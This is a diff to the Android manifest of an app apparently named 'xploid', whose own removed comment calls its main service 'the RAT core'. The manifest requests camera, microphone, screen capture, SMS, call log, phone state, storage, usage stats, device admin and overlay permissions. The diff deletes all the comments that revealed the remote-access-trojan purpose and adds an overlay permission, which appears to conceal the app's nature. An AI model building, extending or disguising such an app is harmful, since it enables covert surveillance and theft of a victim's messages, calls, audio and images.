@@ -2,44 +2,34 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.zero.xploid">
 
-    <!-- Network -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- Foreground service -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
 
-    <!-- Wake lock -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
-    <!-- Audio & Camera -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
 
-    <!-- Flashlight (uses CAMERA permission, no separate FLASHLIGHT permission needed) -->
-
-    <!-- Storage (for file operations) -->
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
 
-    <!-- Phone & SIM info -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
-    <!-- Call log -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
-    <!-- SMS -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
 
-    <!-- Usage stats (to detect foreground app) -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
 
-    <!-- Device Admin (optional, for lock screen etc.) -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
 
     <application
@@ -58,14 +48,12 @@
             </intent-filter>
         </activity>
 
-        <!-- Main service (the RAT core) -->
         <service
             android:name=".MainService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync|mediaProjection|microphone" />
 
-        <!-- SmsReceiver for dangerous SMS alerts (Feature 7) -->
         <receiver
             android:name=".MainService$SmsReceiver"
             android:exported="true"
@@ -75,7 +63,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Device Admin receiver (for AdminReceiver class) -->
         <receiver
             android:name=".AdminReceiver"
             android:description="@string/admin_description"
